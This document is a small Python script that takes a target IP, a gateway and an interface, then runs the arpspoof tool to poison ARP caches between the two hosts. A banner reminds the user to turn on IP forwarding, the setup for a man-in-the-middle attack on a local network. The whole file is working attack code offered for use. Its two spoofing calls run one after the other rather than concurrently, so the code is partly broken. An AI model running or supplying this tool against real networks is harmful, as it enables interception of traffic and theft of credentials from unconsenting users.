import subprocess
import time
import os
print("###DONT FORGET IPFORWARD###")
try:
    ip1=input("enter target ip:")
    gateway=input("enter gateway:")
    interface=input("interface:")
except KeyboardInterrupt:
    print("\nshutdown[OK!]")
    exit()
def start():
    try:
        print("\rSENDING PACKETS .", end="")
        time.sleep(0.5)
        print("\rSENDING PACKETS ..", end="")
        time.sleep(0.5)
        print("\rSENDING PACKETS ...", end="")
        FNULL = open(os.devnull, 'w')
        subprocess.run(["arpspoof", "-i", interface, "-t", ip1, gateway], stdout=FNULL, stderr=subprocess.STDOUT)
        subprocess.run(["arpspoof", "-i", interface, "-t", gateway, ip1], stdout=FNULL, stderr=subprocess.STDOUT)
    except KeyboardInterrupt:
        print("\nshutdown[OK!]")
        exit()
start()



